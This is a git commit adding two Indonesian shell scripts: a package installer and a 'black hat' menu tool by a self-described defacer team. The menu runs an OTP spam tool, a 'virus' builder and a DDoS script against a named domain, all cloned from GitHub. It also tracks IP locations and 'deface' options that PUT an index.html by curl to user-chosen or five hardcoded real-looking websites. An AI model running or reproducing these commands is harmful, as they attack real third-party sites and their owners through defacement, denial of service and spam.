bea301d7d3fe1a35094b4fe87cc702a8f732c69e
DH1Y4-BLACK <72683538+DH1Y4-BLACK@users.noreply.github.com>
2020-10-16 10:06:34 +0700

    Add files via upload

---
+++ bahan.sh
@@ -0,0 +1,17 @@
+echo "\33[32;1m"
+apt install cowsay
+echo "\33[32;1m"
+apt install git
+echo "\33[32;1m"
+apt install wget
+echo "\33[32;1m"
+apt install figlet
+echo "\33[32;1m"
+apt install lolcat
+echo "\33[32;1m"
+apt install python2
+echo "\33[32;1m"
+apt install nano
+echo "\33[32;1m"
+apt install bash
+figlet selesai
---
+++ dhiya.sh
@@ -0,0 +1,255 @@
+clear
+
+figlet -f slant Dhiya os . system
+sleep 1
+python uu.py
+echo "========================================" | lolcat
+figlet -f slant DHIYA KING DEFACER | lolcat
+
+echo "========================================" | lolcat
+echo "Tools By DHIYA DEFACER" | lolcat
+echo "Tools Hanya Dipakai Oleh BLACK HAT" | lolcat
+echo "Team : BLACK CYBER TEAM (ICT)" | lolcat
+echo "========================================" | lolcat
+echo
+echo "(@)==========================(@)" | lolcat
+echo "   1. Installer Bajingan"
+echo "     ====================" | lolcat
+echo "   2.webdav vip Mr_DH1Y4"
+echo "    =========================" | lolcat
+echo "   3.pembuat cirus mematikan" | lolcat
+echo "   ==========================" | lolcat
+echo "\33[31;1m   4.DDOS wifi temen jail"
+echo "==================================" | lolcat
+echo "     5.  lacak ip orang            " | lolcat
+echo "    ==========================    " | lolcat
+echo "    6. brutal spam DH1Y4 OS        " | lolcat
+echo "     ======================       " | lolcat
+echo "       7.wifi-hacker              " | lolcat
+echo "[∆]==========================[∆]" | lolcat
+read -p "pilih yang mana nih: " pill
+if [ $pill = 1 ]
+then
+clear
+echo "Tungguuuu CUK!!!!!!!!"
+echo
+sleep 1
+git clone https://github.com/KANG-NEWBIE/dokOTP
+cd dokOTP
+pip install bs4 requests
+python haldoc.py
+fi
+
+if [ $pill = 2 ]
+then
+clear
+figlet -f slant sabar dulu yaaaaaaaa | lolcat
+
+sleep 1
+echo ""
+clear
+echo "\33[36;1m"
+figlet "webdav vip"
+sleep 2
+clear
+echo "\33[32;1m"
+figlet "DH1Y4 DEFACER PRO"
+echo "\33[32;1m         =========[∆]======="
+echo "\33[36;1m        ====================="
+echo "\33[36;1m       =====Tukang deface====="
+echo "\33[33;1m      ======== FUCK SYSTEM ===="
+echo "\33[31;1m     ==========================="
+echo "\33[32;1m    ============================="
+echo "\33[32;1m   ==============================="
+echo "\33[32;1m  ================================="
+echo "\33[36;1m ======wellcome to DH1Y4 TOOLS======"
+echo "\33[31;1m====================================="
+sleep 2
+clear
+sleep 1
+echo "╔══════════════════════════════════════════════════════════════════════════════════════════════════"
+echo "║ Made by : DH1Y4"
+echo "║ Tools : TOOLS DH1Y4 VIP"
+echo "║ Team : BC/BLACK CYBER TEAM"
+echo "║ Sekutu : Black Panther Team,Ottomam Cyber Team,Newbie Bug Whatsapp"
+echo "║ Thanks To : Tuhan Yang Maha Esa,Kegilaan,Gabut Tingkat Dewa"
+echo "║ My Family :yᴬᴛᵀᴀᶜᴋᴱʀ•кιяιтσッ,ᴬᴛᵀᴀᶜᴋᴱʀ•��Deception☣々ᜰℌ么亇,๖ۣۜ͡ஓ"
+echo "║══════════════════════════════════════════════════════════════════════════════════════════════════"
+sleep 2
+clear
+
+figlet -f slant sabar dulu ini lagi proses | lolcat
+sleep 2
+clear
+figlet -f slant pilih mana nih? | lolcat
+echo "{1}punya target sendiri" | lolcat
+echo "{2}ga punya"
+read -p "pilih yang mana nih: " fak
+if [ $fak = 1 ]
+then
+clear
+echo "Tungguuuu CUK!!!!!!!!"
+sleep 2
+clear
+figlet -f slant wellcome DHIYA king defacer | lolcat
+echo "\33[31;1m"
+read -p "web yang mau di deface : " targett
+sleep 1
+read -p "sc deface lu harus index.html kalo ga bakal gagal : " filee
+sleep 1
+echo "tunggu...."
+sleep 1
+clear
+figlet -f slant file ada di target!!!!!! | lolcat
+sleep 2
+clear
+echo "\33[32;1m"
+figlet "Berhasil!"
+echo "salin disini" | lolcat
+echo "[√]~ ~ ~> $targett" | lolcat
+echo "ini kalo sc lu bukan index.html ~~~>$targett/$filee"
+sleep 1
+curl -T /storage/emulated/0/$filee $targett
+fi
+
+if [ $fak = 2 ]
+then
+clear
+figlet -f slant sabar dulu ya guyss | lolcat
+sleep 2
+clear
+clear
+figlet -f slant ga punya target? | lolcat
+echo "{1}http://whadiz.com" | lolcat
+echo "{2} http://totemafrica.com" | lolcat
+echo "{3}http://uzingela.com" | lolcat
+echo "{4}http://www.drcrsaexpress.co.za" | lolcat
+echo "{5}http://tressor.co.za" | lolcat
+
+echo "{+}========================={+}" | lolcat
+read -p " pilih yang mana nih: " tai
+echo "=========================" |lolcat
+fi
+if [ $tai = 1 ]
+then
+clear
+figlet -f slant sabar dulu ini agak lama | lolcat
+echo
+sleep 1
+curl -T /storage/emulated/0/index.html http://whadiz.com
+fi
+
+if [ $tai = 2 ]
+then
+clear
+figlet -f slant sabar dulu yaaaaaaaa | lolcat
+
+sleep 1
+echo ""
+sleep 1
+curl -T /storage/emulated/0/index.html http://totemafrica.com
+fi
+
+
+if [ $tai = 3 ]
+then
+clear
+figlet -f slant tunggu dulu | lolcat
+clear
+figlet -f slant berhasil!!! | lolcat
+sleep 1
+clear
+echo ""
+sleep 1
+curl -T /storage/emulated/0/index.html http://uzingela.co.za
+fi
+
+
+
+if [ $tai = 4 ]
+then
+clear
+figlet -f slant sabar aja dulu | lolcat
+sleep 1
+clear
+figlet -f slant berhasil! | lolcat
+sleep 1
+echo ""
+sleep 1
+curl -T /storage/emulated/0/index.html http://www.drcrsaexpress.co.za
+fi
+
+
+
+if [ $tai = 5 ]
+then
+clear
+figlet -f slant ok siap | lolcat
+sleep 1
+clear
+figlet -f slant berhasil | lolcat
+echo ""
+sleep 1
+curl -T /storage/emulated/0/index.html http://tressor.co.za
+fi
+fi
+
+
+if [ $pill = 3 ]
+then
+clear
+echo "\33[31;1m"
+figlet -f slant  virus akan di buat!!!!
+sleep 2
+clear
+figlet -f slant virus di buat!!!
+sleep 1
+git clone https://github.com/storiku/virus
+cd virus
+python2 vbug.py
+fi
+
+
+if [ $pill = 4 ]
+then
+clear
+echo "\33[31;1m"
+figlet -f slant DDOS AKAN DI Mulai
+sleep 1
+pkg install git -y
+pkg install python2 -y
+git clone https://github.com/kumpulanremaja/ddos2
+cd ddos2
+python2 ddos.py  ziady.com 1000 2000
+fi
+
+
+if [ $pill = 5 ]
+then
+clear
+echo "\33[31;1m"
+read -p "ip target lu: " ipu
+figlet -f slant ip akan di pacak!! | lolcat
+git clone https://github.com/maldevel/IPGeolocation
+cd IPGeolocation
+chmod +x ipgeolocation.py
+pip install -r requirements.txt
+python ipgeolocation.py -t $ipu
+fi
+
+
+if [ $pill = 6 ]
+then
+clear
+python dhiya.py
+fi
+
+
+if [ $pill = 7 ]
+then
+clear
+cd
+cd wifi-hacker
+ls
+
+fi
